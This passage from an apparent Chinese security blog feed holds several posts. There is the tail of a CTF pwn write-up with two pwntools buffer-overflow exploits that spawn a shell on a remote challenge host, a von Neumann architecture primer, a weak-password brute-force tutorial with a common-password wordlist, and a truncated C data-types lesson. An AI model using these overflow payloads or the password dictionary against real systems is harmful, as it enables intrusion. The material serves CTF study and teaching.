我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了<code>system(&quot;/bin/sh&quot;)</code>，如下图：</p><p><img src="/images/134-4.png" alt></p><p>      那么我们是否可以将main函数的返回地址填充为<code>system(&quot;/bin/sh&quot;)</code>函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">shell_addr = <span class="number">0x804863A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(shell_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>执行结果如下：</p></blockquote><p><img src="/images/134-5.png" alt></p><h3 id="font-color-navy0x02-姿势二font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-姿势二font"></a> <font color="navy"><code>0x02 姿势二</code></font></h3><p>      第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串<code>/bin/sh</code>的地址，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary ymjr --string &quot;/bin/sh&quot;</span><br><span class="line"></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048763 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"221.228.109.254"</span>,<span class="number">10002</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ymjr"</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x08048763</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把返回地址中填充secure_addr地址</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">108</span><span class="comment"># v4空间的填充</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># old ebp的填充</span></span><br><span class="line">payload += p32(system_addr)<span class="comment"># 返回地址填充为secure的地址</span></span><br><span class="line">payload += <span class="string">b'a'</span>*<span class="number">4</span><span class="comment"># system函数的返回地址，我们并不管执行system函数以后的返回地址</span></span><br><span class="line">payload += p32(bin_sh_addr)<span class="comment"># system函数的参数/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"There is something amazing here, do you know anything?"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;      这道题目真的太坑了，不过也给我提了一个醒，就是&lt;code&gt;在做题时不能对IDA pro反编译的伪代码过于相信&lt;/code&gt;，在感觉有问题的地方，一定自己用&lt;code&gt;GDB&lt;/code&gt;调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="看雪CTF" scheme="https://muzibing.github.io/tags/%E7%9C%8B%E9%9B%AACTF/"/>
    
  </entry>
  
  <entry>
    <title>【科普】冯·诺依曼结构与具体实现</title>
    <link href="https://muzibing.github.io/2020/07/03/2020.07.03%EF%BC%88133%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/03/2020.07.03（133）/</id>
    <published>2020-07-02T16:00:00.000Z</published>
    <updated>2020-07-03T07:24:55.662Z</updated>
    
    <content type="html"><![CDATA[<h4 id="font-color-navy1冯诺依曼计算的主要构成font"><a class="markdownIt-Anchor" href="#font-color-navy1冯诺依曼计算的主要构成font"></a> <font color="navy">1.冯·诺依曼计算的主要构成</font></h4><p>      冯·诺依曼计算机主要是由五大部分构成：</p><ol><li>运算器（CA）：Central Arithmetical</li><li>控制器（CC）：Central Contral</li><li>存储器（M）：Memory</li><li>输入设备（I）：Input</li><li>输出设备（O）：Output</li></ol><p>      除了上述五部分，还有一个<code>外部记录介质 R</code>(outside Recording medium)，示意图如下：</p><p><img src="/images/133-1.png" alt></p><blockquote><p>下面我们就来看看和具体实现是如何对应的呢？</p></blockquote><h4 id="font-color-navy2冯诺依曼结构原理与实现的对应font"><a class="markdownIt-Anchor" href="#font-color-navy2冯诺依曼结构原理与实现的对应font"></a> <font color="navy">2.冯·诺依曼结构原理与实现的对应</font></h4><p><img src="/images/133-2.png" alt></p><p>      如上图，它们一一对应关系如下：</p><blockquote><ul><li>CPU ⇢ 运算器 CA和控制器 CC</li><li>主存 ⇢ 存储器 M</li><li>键盘 ⇢ 输入设备 I</li><li>硬盘、显示器 ⇢  输出设备</li></ul></blockquote><p>      在这里要说明的是主板上的<code>北桥</code>、<code>南桥</code>和<code>BIOS</code>三个部件</p><p><code>北桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在主板上，CPU是如何获取指令并去执行的呢？上图的主板上采取了南北桥结构，CPU对外会连接一块芯片北桥，CPU想要访问主存，就必须通过北桥芯片。</span><br></pre></td></tr></table></figure><p><code>南桥</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在北桥下方有一块芯片，叫做南桥，南桥内部集成了很多输入输出设备的控制器，其中就包括硬盘的控制器，也就是说硬盘实际上就是和南桥相连的。</span><br></pre></td></tr></table></figure><p><code>BIOS</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要注意，计算机刚启动时，主存中是没有信息的，因为断电后主存的信息都会丢失，这是RAM的一个特性，那么系统启动以后，CPU从什么地方获取指令呢？</span><br><span class="line">是否是从硬盘中取得呢？不是的，因为从硬盘访问数据相对比较复杂，那么实际上在主板上还有一个很小的芯片，它与南桥相连，一般称之为BIOS（Base Input Output System）芯片，该芯片存储容量很小，会保存一段比较简单但是比较重要的程序，包括检查主板上都有哪些设备，并且检查这些设备是否工作正常，这个芯片实际上是一个只读存储器（ROM），当断电后BIOS芯片中的数据是不会丢失的，但是从冯·诺依曼结构上来看，它并不属于存储器的范畴，而是和硬盘一样属于外部记录介质R，所以当计算机启动后，CPU会一次通过北桥 -&gt; 南桥，访问到BIOS芯片，从中取得指令。</span><br><span class="line">CPU从BIOS芯片中取得指令后，会依次检查主板上的各个设备，包括是否有显卡，通过显卡连接显示器，检查键盘的存在</span><br></pre></td></tr></table></figure><p>      目前显卡的功能越来越复杂，性能也越来越强大，尤其是其中的图形处理单元（GPU），GPU往往也可以进行复杂的数学计算，拥有很强的运算能力，有时候也让GPU承担一些运算的工作，实际上在高性能的运算中会采用大量的GPU来进行运算，从这个意义上将GPU也承担了运算器和控制器的一些功能。而南北桥也在迅速的发生变化。</p><h4 id="font-color-navy3南北桥架构的演变font"><a class="markdownIt-Anchor" href="#font-color-navy3南北桥架构的演变font"></a> <font color="navy">3.南北桥架构的演变</font></h4><p><code>演变（1）</code></p><p><img src="/images/133-3.png" alt></p><p>      上图还是刚才的主板。我们先来看图中右侧部分，最上方是CPU，其中往往包含很多CPU核；向下CPU连接的是北桥，北桥中主要有主存控制器—对外连接主存，现在的显卡一般采用PCIe接口，所以在北桥中有一个PCIe控制器，对外通过PCIe插槽连接PCIe显卡，当然对显存的要求不高，可以通过北桥的集成显卡直接连接显示器；北桥还连接着南桥，南桥中集中了大多数I/O设备的控制器。</p><p>      下面再来看左侧部分，红色箭头部分表示传输压力很大，而绿色部分表示传输压力较小，在这种情况下，最主要解决对性能影响最大的关键问题，就是<code>CPU访问主存的通道</code>，所以在南北桥上发生的第一个变化如下。</p><p><code>演变（2）</code></p><p><img src="/images/133-4.png" alt></p><p>      如上图，在南北桥上发生的第一个变化，就是<strong>北桥的主控制器被移到了CPU芯片中</strong>，从图中可以看到，CPU卡槽离主存卡槽更近，这是因为现在CPU是直接访问主存的，而不需要再通过访问北桥了，这样大大提高了数据传输率，现在显示的通道就成为了要解决的下一个问题。</p><p><code>演变（3）</code></p><p><img src="/images/133-5.png" alt></p><p>     如上图，在最新的个人计算机的CPU设计中，不仅包含了主存控制器，还包含了PCIe控制器，在外部可以直接连接显卡，这样北桥的的重要部件都被集成到了CPU中，那么北桥就没有存在的必要了，于是将北桥剩余的一些功能整合到南桥中，那么所谓南北桥架构已经消失了，由于没有北桥，那么南桥的名字也显得奇怪了，所以往往有一些不同的名字，比如PCH等。这样就将大部分通过主板连接的线路，集成到了CPU内部，这样就大大的提升了系统的性能。</p><p><code>演变（4）</code></p><p><img src="/images/133-6.png" alt></p><p>      什么是系统芯片呢？系统芯片<code>就是将计算机或其他电子系统集成为单一芯片的集成电路</code>，这种芯片在智能手机、平板电脑等移动计算设备上得到了广泛应用。下面要提的是一个著名定理<code>摩尔定律</code></p><h4 id="font-color-navy4摩尔定律font"><a class="markdownIt-Anchor" href="#font-color-navy4摩尔定律font"></a> <font color="navy">4.摩尔定律</font></h4><p><code>摩尔定律原型</code></p><p>      1965年，摩尔在《电子学》杂志上预测：<code>在最低元件价格下，集成电路的复杂度每年大约增加一倍，这一增长率至少可以维持十年</code>。这就是摩尔定律的原型。但是于1967年，摩尔调整了预测，<code>在最低元件价格下，集成电路的复杂度每两年增加一倍，这一增长率至少可以维持十年</code>。</p><p><code>现在摩尔定律的描述</code></p><p>      现在摩尔定律常被描述为：<code>当价格不变时，集成电路上可容纳的晶体管数目，约每隔18个月便会增加一倍，性能也将提升一倍</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy1冯诺依曼计算的主要构成font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;1.冯·诺依
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【web安全】爆破用户登录弱口令</title>
    <link href="https://muzibing.github.io/2020/07/01/2020.07.01%EF%BC%88132%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/01/2020.07.01（132）/</id>
    <published>2020-06-30T16:00:00.000Z</published>
    <updated>2020-07-01T08:04:31.897Z</updated>
    
    <content type="html"><![CDATA[<p>     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如<code>123456789</code>、<code>88888888</code>等，大家也许知道这样的密码是不安全的，但是并不清楚为什么不安全。今天我就带着大家的疑问，来和大家讲一下<font color="navy"><code>弱口令</code></font>为什么不安全的。</p><p><code>情景假设</code></p><blockquote><p>加入小明自己写了一个登陆系统，如下图，他在设置管理员密码时，随便输入一串字符串。这里我们并不知道这个密码是多少，下面看一下我们是否能登录该系统。</p></blockquote><p><img src="/images/132-1.png" alt></p><h4 id="font-color-navy1创建字典font"><a class="markdownIt-Anchor" href="#font-color-navy1创建字典font"></a> <font color="navy">1.创建字典</font></h4><p>     情境中给出了说明：随便输了一串字符串。那我们先假设这段字符串很简单，我们根据人们常用的密码创建一个密码字典，以备我们后面使用，字典部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">123456789</span><br><span class="line">a123456</span><br><span class="line">123456</span><br><span class="line">a123456789</span><br><span class="line">1234567890</span><br><span class="line">woaini1314</span><br><span class="line">qq123456</span><br><span class="line">abc123456</span><br><span class="line">123456a</span><br><span class="line">123456789a</span><br><span class="line">147258369</span><br><span class="line">zxcvbnm</span><br><span class="line">987654321</span><br><span class="line">12345678910</span><br><span class="line">abc123</span><br><span class="line">qq123456789</span><br><span class="line">123456789.</span><br><span class="line">7708801314520</span><br><span class="line">woaini</span><br><span class="line">5201314520</span><br><span class="line">q123456</span><br><span class="line">123456abc</span><br><span class="line">1233211234567</span><br><span class="line">123123123</span><br><span class="line">123456.</span><br><span class="line">0123456789</span><br><span class="line">asd123456</span><br><span class="line">aa123456</span><br><span class="line">135792468</span><br><span class="line">q123456789</span><br><span class="line">abcd123456</span><br><span class="line">12345678900</span><br><span class="line">woaini520</span><br><span class="line">woaini123</span><br><span class="line">zxcvbnm123</span><br><span class="line">1111111111111111</span><br><span class="line">w123456</span><br><span class="line">aini1314</span><br><span class="line">abc123456789</span><br><span class="line">111111</span><br><span class="line">woaini521</span><br><span class="line">qwertyuiop</span><br><span class="line">1314520520</span><br><span class="line">1234567891</span><br><span class="line">qwe123456</span><br><span class="line">asd123</span><br><span class="line">000000</span><br><span class="line">1472583690</span><br><span class="line">1357924680</span><br><span class="line">789456123</span><br><span class="line">123456789abc</span><br><span class="line">z123456</span><br><span class="line">1234567899</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2爆破密码font"><a class="markdownIt-Anchor" href="#font-color-navy2爆破密码font"></a> <font color="navy">2.爆破密码</font></h4><p>      在这里我们要用到一个抓包工具<code>Burp Suit</code>（666666），它长下面这个样子：</p><p><img src="/images/132-2.png" alt></p><p>      下面我用动图R的形式来展示一下爆破的整个过程：</p><p><img src="/images/132-3.gif" alt></p><blockquote><p>可以从上图中看出，管理员密码为<code>123456</code>，所以说通过这个简单的例子可以看出，我们平常在设置密码时尽量不要用弱口令，尽量使用字母、数字和符号的混合字符串，以保证我们账户的安全性。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;     前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如&lt;code&gt;123456789&lt;/cod
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>【C语言学习系列二】 C语言中的基本数据类型</title>
    <link href="https://muzibing.github.io/2020/06/26/2020.06.24%EF%BC%88131%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/26/2020.06.24（131）/</id>
    <published>2020-06-25T16:00:00.000Z</published>
    <updated>2020-06-26T11:00:38.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基本数据类型font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基本数据类型font"></a> <font color="navy"><code>0x00 基本数据类型</code></font></h3><p><img src="/images/131-1.png" alt></p><table><thead><tr><th style="text-align:center"><font size="2">基本类型</font></th><th style="text-align:center"><font size="2">字节</font></th><th style="text-align:center"><font size="2">范围</font></th></tr></thead><tbody><tr><td style="text-align:center"><font size="2">char</font></td><td style="text-align:center"><font size="2">1byte</font></td><td style="text-align:center"><font size="2">—</font></td></tr><tr><td style="text-align:center"><font color="navy" size="2">short</font></td><td style="text-align:center"><font size="2">2bytes</font></td><td style="text-align:center"><font size="2">0~32767(0~0x7fff)<br>-32768~-1(0x8000~0xffff)</font></td></tr><tr><td style="text-align:center"><font size="2">int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~2147483647(0~0x7fffffff)<br>-2147483648~-1(0x80000000~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned int</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">0~4294967295(0~0xffffffff)</font></td></tr><tr><td style="text-align:center"><font size="2">long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">正: 0~0x7fffffffffffffff<br>负: 0x8000000000000000~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">unsigned long int</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">0~0xffffffffffffffff</font></td></tr><tr><td style="text-align:center"><font size="2">float</font></td><td style="text-align:center"><font size="2">4bytes</font></td><td style="text-align:center"><font size="2">|3.4e-38|~|3.4e+38|</font></td></tr><tr><td style="text-align:center"><font size="2">double</font></td><td style="text-align:center"><font size="2">8bytes</font></td><td style="text-align:center"><font size="2">|1.7e-308|~|1.7e+308|</font></td></tr></tbody></table><blockquote><p>下面我们用一个示例代码打印一下这些基本的数据类型，代码如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function: 打印基本数据类型的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of char is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of short is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of long int is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of float is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The size of double is %d bytes\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The size of char is 1 bytes</span><br><span class="line">The size of short is 2 bytes</span><br><span class="line">The size of int is 4 bytes</span><br><span class="line">The size of long int is 4 bytes</span><br><span class="line">The size of float is 4 bytes</span><br><span class="line">The size of double is 8 bytes</span><br></pre></td></tr></table></figure><blockquote><p><font size="2">需要说明的是上述程序的运行环境为32位，所以long的字节数是4bytes，而在64位环境下则为8bytes</font></p></blockquote><h4 id="font-color-blue-1有符号和无符号font"><a class="markdownIt-Anchor" href="#font-color-blue-1有符号和无符号font"></a> <font color="blue"><code>1.有符号和无符号</code></font></h4><p>      对于有符号和无符号数据类型这块，我想首先用一个问题来引出这部分的重点内容——<code>计算机怎么知道数值是有符号的还是无符号的呢？</code>众所周知，数值在计算机内部的存储方式是以<code>0 1</code>方式进行存储的，比如数值<code>4</code>在16位环境下的存储形式为<code>0000 0000 0000 0100</code>，很简单就能知道这是一个正数4，那么如果存储的是<code>-4</code>呢？（<font color="green" size="2">大家思考一下负数在内存的存储方式</font>），要知道<code>-4</code>在内存是以它的补码形式进行存储的，首先来看<code>-4</code>从原码到补码的转变：<code>1</code> <code>000 0100</code> <font size="2">（原码）</font>⇥ <code>1</code> <code>111 1011</code><font size="2">（反码）</font>⇥ <code>1</code> <code>111 1100</code> <font size="2">（补码）</font>，那么<code>-4</code>在内存的存储形式为<code>0xfc</code>，下面我们可以看一下32位环境下的无符号和有符号定义下<code>-4</code>和<code>4</code>的存储形式，是否和我们推导的一致呢？如下图：</p><p><img src="/images/131-2.png" alt></p><p>      从上图可以看出对于有符号数值是以数值的补码形式进行存储的，但是对于无符号下的负数是什么原因呢？这是因为你前面加上符号之后，相当于把变量提升为有符号类型，所以和正常的有符号下的存储是一样的。</p><blockquote><p><font color="red"><strong>知识点一</strong></font>：无论是整数和负数，在计算机内部都是以它们的补码的形式进行存储的。</p></blockquote><p>     这里通过一个简单的程序引出下面的问题，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">2147483649</span>, usum;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>, sum;</span><br><span class="line">        usum = i + j;</span><br><span class="line">    sum = i + j;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %d (d)\n"</span>,usum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usum = 214783649 + 1 = %u (u)\n"</span>,usum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %d (d)\n"</span>,sum);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sum = 214783649 + 1 = %u (u)\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在看下方结果之前，大家先思考一下应该是什么结果？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">usum = 214783649 + 1 = 2147483650 (u)</span><br><span class="line">sum = 214783649 + 1 = -2147483646 (d)</span><br><span class="line">sum = 214783649 + 1 = 2147483650 (u)</span><br></pre></td></tr></table></figure><blockquote><p>看到上面的输出结果，我猜大家可能会有这样的问题：</p><ul><li>i和j都是正数，两个数相加之后怎么成负数了？</li><li>为什么格式符不同，输出的结果也不通呢？</li><li>usum是<code>unsigned int</code>类型，怎么成为了负数呢？</li></ul><p>下面我们一步一步的来进行解析。</p></blockquote><p>      首先我们知道了数值在机器内存是以补码的形式进行存储的，那么对于两个数相加机器是怎么处理的呢？在汇编层次，一般通过<code>add eax,edx</code>进行的，其中将<code>eax</code>和<code>edx</code>中的二进制相加，然后把结果存储到寄存器<code>eax</code>中，所以说<code>214783649 + 1</code>对于机器来说只不过是将这两个的二进制形式相加而已，关于补码加减运算应该要注意的是：负数的求反码和补码过程符号位是不参与计算的，要取出来，只有在进行负数补码的加减法的时候<code>符号位</code>才参与计算<sup>[1]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   214783649     1000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">+          1   +0000 0000 0000 0000 0000 0000 0000 0001</span><br><span class="line">-------------   -----------------------------------------</span><br><span class="line">   ?&lt;=  1000 0000 0000 0000 0000 0000 0000 0010</span><br></pre></td></tr></table></figure><blockquote><p>关键的要来了，机器会把<code>1000 0000 0000 0000 0000 0000 0000 0010</code>看做什么呢？</p><ul><li>如果是有符号的话，则它的原码为<code>1111 1111 1111 1111 1111 1111 1111 1100</code>，因为是有符号的，所以最高位为符号位，为1表示是负数，那么<code>1111111111111111111111111111110</code>(去掉符号位的二进制)的十进制为<code>2147483646</code>，再加上符号，那么就是<code>-2147483646</code></li><li>如果是无符号的话，则它的原码就是其本身，那么该二进制的十进制为<code>2147483650</code></li></ul><p>之所以出现上述结果，原因在于格式符<code>%d</code>和<code>%u</code>：</p><ul><li><code>%d</code>是输出<strong>带符号</strong>十进制定点格式，也就是说机器通过<code>%d</code>将本无意义的二进制看作有符号的数值，那么第一位是符号位；</li><li><code>%u</code>是输出<strong>无符号</strong>十进制定点格式，也就是说不管前面是如何定义的，在这里的输出机器就把二进制串解析成无符号的十进制；</li></ul></blockquote><p><code>小节总结：</code></p><blockquote><ul><li>数值在内存中都以补码的形式进行存储和计算；(为什么要以补码的形式呢，见参考文献[1])</li><li>数值是有符号还是无符号，看用户怎么使用</li></ul></blockquote><h4 id="font-color-blue2浮点数在内存的存储形式font"><a class="markdownIt-Anchor" href="#font-color-blue2浮点数在内存的存储形式font"></a> <font color="blue"><code>2.浮点数在内存的存储形式</code></font></h4><p>      首先要说明的是，这里我们不会对浮点数的具体知识点展开，比如精度问题。我们知道了整型数值在内存中是以其补码的形式进行存储的，那浮点数在内存中是以什么形式进行存储的呢？既然不太清楚，那我们就先用一个简单的例子来看一下浮点数的存储方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">4.5</span>;<span class="comment">// 二进制形式为0000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="keyword">float</span> b = <span class="number">-4.5</span>;<span class="comment">// 二进制形式为1000 0000 0000 0000 0000 0000 0000 0100.1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] a:%f\n[*] b:%f\n"</span>,a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      我们将其程序编译为32位的ELF程序，用GDB看一下ａ和ｂ的存储形式，如下：</p><p><img src="/images/131-3.jpg" alt></p><p>      我们现在对比一下a和b的二进制形式和在计算机内存存放的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ab</span><br><span class="line">数值自身形式：00000000000000000000000000000100.110000000000000000000000000000100.1</span><br><span class="line">内存中的存储：0100000010010000000000000000000011000000100100000000000000000000</span><br></pre></td></tr></table></figure><blockquote><p>可以看出数值本身的二进制形式和存放在内存中的形式完全不同，这是因为浮点数与整数的存储方式完全不同，根据<a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" 